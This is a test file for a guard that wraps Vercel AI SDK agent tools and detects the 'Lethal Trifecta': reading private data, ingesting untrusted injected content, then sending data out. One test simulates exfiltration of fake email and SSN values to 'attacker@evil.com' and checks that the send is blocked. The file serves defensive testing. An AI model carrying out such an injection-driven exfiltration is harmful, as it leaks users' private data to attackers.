/**
 * Tests for the Vercel AI SDK adapter (guardVercelAI).
 * Uses mock tool objects with the structural VercelAITool interface.
 */

import { describe, it, expect, vi } from 'vitest';
import { guardVercelAI } from '../../src/adapters/vercel-ai.js';
import type { VercelAIToolMap, VercelAIGuardConfig } from '../../src/adapters/vercel-ai.js';
import type { CerberusConfig } from '../../src/types/config.js';

const PRIVATE_DATA = JSON.stringify({
  records: [{ email: 'alice@example.com', ssn: '123-45-6789', phone: '+1-555-0101' }],
});

const CONFIG: CerberusConfig = {
  alertMode: 'interrupt',
  threshold: 3,
  trustOverrides: [
    { toolName: 'readPrivateData', trustLevel: 'trusted' },
    { toolName: 'fetchExternalContent', trustLevel: 'untrusted' },
  ],
};

const OUTBOUND_TOOLS = ['sendOutboundReport'];

function makeTools(): VercelAIToolMap {
  return {
    readPrivateData: {
      description: 'Read private data',
      parameters: {},
      execute: vi.fn().mockResolvedValue(PRIVATE_DATA),
    },
    fetchExternalContent: {
      description: 'Fetch external content',
      parameters: {},
      execute: vi.fn().mockResolvedValue('<html>injected</html>'),
    },
    sendOutboundReport: {
      description: 'Send outbound report',
      parameters: {},
      execute: vi.fn().mockResolvedValue('sent'),
    },
  };
}

function makeConfig(overrides?: Partial<CerberusConfig>): VercelAIGuardConfig {
  return {
    cerberus: { ...CONFIG, ...overrides },
    outboundTools: OUTBOUND_TOOLS,
  };
}

describe('guardVercelAI', () => {
  it('should return wrapped tools with same names', () => {
    const tools = makeTools();
    const result = guardVercelAI(tools, makeConfig());

    expect(Object.keys(result.tools)).toEqual([
      'readPrivateData',
      'fetchExternalContent',
      'sendOutboundReport',
    ]);
  });

  it('should preserve tool description and parameters', () => {
    const tools = makeTools();
    const result = guardVercelAI(tools, makeConfig());

    expect(result.tools.readPrivateData.description).toBe('Read private data');
    expect(result.tools.readPrivateData.parameters).toEqual({});
  });

  it('should create a session', () => {
    const result = guardVercelAI(makeTools(), makeConfig());
    expect(result.session).toBeDefined();
    expect(result.session.sessionId).toBeTruthy();
  });

  it('should pass args through to original execute', async () => {
    const tools = makeTools();
    const result = guardVercelAI(tools, makeConfig());

    await result.tools.readPrivateData.execute!({ customerId: 'CUST-001' });

    expect(tools.readPrivateData.execute).toHaveBeenCalledWith({ customerId: 'CUST-001' });
  });

  it('should accumulate assessments across tool calls', async () => {
    const result = guardVercelAI(makeTools(), makeConfig());

    await result.tools.readPrivateData.execute!({});
    await result.tools.fetchExternalContent.execute!({ url: 'https://example.com' });

    expect(result.assessments).toHaveLength(2);
    expect(result.assessments[0].vector.l1).toBe(true);
    expect(result.assessments[1].vector.l2).toBe(true);
  });

  it('should detect full Lethal Trifecta and block exfiltration', async () => {
    const result = guardVercelAI(makeTools(), makeConfig());

    // L1
    await result.tools.readPrivateData.execute!({});
    // L2
    await result.tools.fetchExternalContent.execute!({ url: 'https://evil.com' });
    // L3 → blocked
    const sendResult = await result.tools.sendOutboundReport.execute!({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com 123-45-6789',
    });

    expect(sendResult).toContain('[Cerberus]');
    expect(sendResult).toContain('blocked');
    expect(result.assessments).toHaveLength(3);
    expect(result.assessments[2].score).toBe(3);
  });

  it('should reset session and assessments', async () => {
    const result = guardVercelAI(makeTools(), makeConfig());

    await result.tools.readPrivateData.execute!({});
    expect(result.assessments).toHaveLength(1);

    result.reset();

    expect(result.assessments).toHaveLength(0);
    expect(result.session.turnCounter).toBe(0);
  });

  it('should have destroy method that does not throw', () => {
    const result = guardVercelAI(makeTools(), makeConfig());
    result.destroy();
  });

  it('should pass through tools without execute function', () => {
    const tools: VercelAIToolMap = {
      readOnly: { description: 'Schema-only tool' },
      withExecute: {
        description: 'Has execute',
        execute: vi.fn().mockResolvedValue('ok'),
      },
    };

    const result = guardVercelAI(tools, makeConfig());

    expect(result.tools.readOnly).toBe(tools.readOnly);
    expect(result.tools.withExecute.execute).toBeDefined();
    expect(result.tools.withExecute.execute).not.toBe(tools.withExecute.execute);
  });

  it('should handle empty tools map', () => {
    const result = guardVercelAI({}, makeConfig());
    expect(Object.keys(result.tools)).toHaveLength(0);
    expect(result.session).toBeDefined();
    result.destroy();
  });
});
